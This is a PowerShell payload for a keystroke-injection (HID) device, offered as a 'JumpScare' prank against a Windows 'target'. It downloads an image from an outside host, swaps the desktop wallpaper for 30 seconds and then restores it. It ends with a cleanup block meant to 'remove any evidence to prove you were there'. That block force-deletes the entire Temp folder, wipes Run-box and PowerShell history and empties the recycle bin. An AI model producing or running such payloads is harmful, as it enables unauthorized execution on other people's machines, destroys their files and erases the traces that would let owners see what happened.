############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : JumpScare         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.NOTES
    This script can be run as is with the provided execution file
.DESCRIPTION 
    This script will download a specific image, change the wallpaper for 30 seconds, and then revert to the original wallpaper.
#>

############################################################################################################################################################

# Download the specific image
$imageUrl = "https://i.imgur.com/j79rMvu.png"
$imagePath = "$env:TMP\i.png"
Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

# Get the current wallpaper path and settings
$currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
$wallpaperStyle = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle).WallpaperStyle
$tileWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper).TileWallpaper

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
    This will take the image you downloaded and set it as the target's wallpaper
#>

Function Set-WallPaper {
 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style = 'Center'
)
 
$WallpaperStyle = Switch ($Style) {
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
}

If ($Style -eq "Tile") {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
} Else {
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;

public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 

$SPI_SETDESKWALLPAPER = 0x0014
$UpdateIniFile = 0x01
$SendChangeEvent = 0x02

$fWinIni = $UpdateIniFile -bor $SendChangeEvent

$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#----------------------------------------------------------------------------------------------------

# No need to pause, we execute immediately

# Set the new wallpaper
Set-WallPaper -Image "$imagePath" -Style Center

# Wait for 30 seconds before reverting the wallpaper
Start-Sleep -Seconds 30

# Revert to the original wallpaper
Set-WallPaper -Image $currentWallpaper -Style Center

# Restore the original wallpaper style and tile settings
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $wallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value $tileWallpaper -Force

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
    This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete PowerShell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off 
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

# If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true) {
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}
